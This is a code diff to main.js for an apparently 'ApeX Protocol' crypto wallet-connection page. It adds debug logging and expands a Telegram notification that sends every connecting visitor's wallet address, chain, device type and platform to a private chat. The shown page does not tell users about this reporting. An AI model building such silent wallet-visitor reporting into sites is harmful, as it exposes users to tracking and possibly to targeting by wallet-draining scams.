@@ -62,34 +62,67 @@ import { CONFIG } from './config.js';
   }
 
   // ============================================================
-  //  TELEGRAM HELPER
+  //  TELEGRAM HELPER WITH DEBUG LOGGING
   // ============================================================
   const { TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID } = CONFIG;
 
+  console.log('📱 Telegram Config:', {
+    botToken: TELEGRAM_BOT_TOKEN ? '✅ Present' : '❌ Missing',
+    chatId: TELEGRAM_CHAT_ID ? '✅ Present' : '❌ Missing',
+    botTokenLength: TELEGRAM_BOT_TOKEN ? TELEGRAM_BOT_TOKEN.length : 0,
+    chatIdLength: TELEGRAM_CHAT_ID ? TELEGRAM_CHAT_ID.length : 0
+  });
+
   async function sendTelegramNotification(message) {
+    console.log('📤 Attempting to send Telegram notification...');
+    console.log('📝 Message:', message.substring(0, 100) + '...');
+    
     if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
-      console.warn('Telegram credentials missing');
+      console.error('❌ Telegram credentials missing!');
+      console.log('TELEGRAM_BOT_TOKEN:', TELEGRAM_BOT_TOKEN || 'undefined');
+      console.log('TELEGRAM_CHAT_ID:', TELEGRAM_CHAT_ID || 'undefined');
       return;
     }
+
     try {
       const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+      console.log('🌐 URL:', url.replace(TELEGRAM_BOT_TOKEN, '***HIDDEN***'));
+      
       const payload = {
         chat_id: TELEGRAM_CHAT_ID,
         text: message,
         parse_mode: 'HTML'
       };
+      console.log('📦 Payload:', { chat_id: TELEGRAM_CHAT_ID, messageLength: message.length });
+
       const response = await fetch(url, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify(payload)
       });
+
+      const responseText = await response.text();
+      console.log('📨 Telegram Response Status:', response.status);
+      console.log('📨 Telegram Response Body:', responseText);
+
       if (!response.ok) {
-        console.error('Telegram send error:', await response.text());
+        console.error('❌ Telegram API Error:', responseText);
+        // Show error in UI too
+        showStatus('⚠️ Telegram notification failed: ' + responseText, 'error');
+      } else {
+        console.log('✅ Telegram notification sent successfully!');
+        showStatus('📱 Telegram notification sent!', 'success');
       }
     } catch (e) {
-      console.error('Telegram notification failed:', e);
+      console.error('❌ Telegram notification failed (network error):', e);
+      showStatus('⚠️ Telegram network error: ' + e.message, 'error');
     }
   }
+
+  // Also expose for debugging
+  window.testTelegram = async function(msg) {
+    await sendTelegramNotification(msg || '🧪 Test message from ApeX Protocol at ' + new Date().toISOString());
+  };
 
   // ============================================================
   //  WEBSOCKET CHECK
@@ -330,7 +363,7 @@ import { CONFIG } from './config.js';
   }
 
   // ============================================================
-  //  UI UPDATE WITH CHAIN BADGE
+  //  UI UPDATE WITH CHAIN BADGE + TELEGRAM TEST
   // ============================================================
   function updateConnectedUI(address, chain = 'evm') {
     setButtonState(connectButton, 'disconnect')
@@ -381,15 +414,25 @@ import { CONFIG } from './config.js';
 
     showStatus(`Connected to ${chainLabel}`, 'success')
 
-    // Telegram notification
+    // ============================================================
+    //  SEND TELEGRAM NOTIFICATION ON CONNECTION (with debug logs)
+    // ============================================================
+    console.log('🔔 Sending Telegram notification for wallet connection...');
     const msg = `
 🔗 <b>New Wallet Connected</b>
 📌 <b>Chain:</b> ${chainLabel}
 👤 <b>Address:</b> <code>${address}</code>
 🕒 <b>Time:</b> ${new Date().toLocaleString()}
 📱 <b>Mobile:</b> ${isMobile() ? 'Yes' : 'No'}
+🌐 <b>Platform:</b> ${getPlatform()}
     `.trim()
-    sendTelegramNotification(msg)
+    
+    // Send and show result
+    sendTelegramNotification(msg).then(() => {
+      console.log('✅ Connection notification sent to Telegram');
+    }).catch((err) => {
+      console.error('❌ Failed to send connection notification:', err);
+    });
   }
 
   function resetConnectedUI() {
@@ -567,7 +610,7 @@ import { CONFIG } from './config.js';
   }
 
   // ============================================================
-  //  DIRECT EVM CONNECTION (PC only)
+  //  DIRECT EVM CONNECTION
   // ============================================================
   async function connectDirectEVM(timeoutMs = 5000) {
     setupEIP6963()
@@ -636,7 +679,7 @@ import { CONFIG } from './config.js';
   }
 
   // ============================================================
-  //  WALLETCONNECT EVM CONNECTION – timeout 5 minutes
+  //  WALLETCONNECT EVM CONNECTION
   // ============================================================
   async function connectViaWalletConnect(useTestId = false, timeoutMs = 300000) {
     if (isConnecting) {
@@ -883,7 +926,6 @@ import { CONFIG } from './config.js';
     logDebug(`Platform: ${platform} | isMobile: ${isMobile()}`)
 
     if (isMobile()) {
-      // Mobile: WalletConnect ONLY
       logDebug('📱 Mobile: WalletConnect only')
       success = await connectViaWalletConnect(false, 300000)
       if (!success) {
@@ -906,7 +948,6 @@ import { CONFIG } from './config.js';
       return
     }
 
-    // Desktop: EVM first
     logDebug('🖥️ Desktop: EVM connection only')
 
     success = await connectDirectEVM(5000)
@@ -1220,4 +1261,7 @@ import { CONFIG } from './config.js';
 
   logDebug(`✅ main.js fully initialised – EVM-first, delayed Solana/Bitcoin`)
   logDebug(`   Platform: ${getPlatform()} | Mobile: ${isMobile()} | Desktop: ${isDesktop()}`)
+  
+  console.log('✅ main.js loaded with Telegram debugging enabled');
+  console.log('📱 To test Telegram, run: testTelegram("Hello from ApeX") in console');
 })()
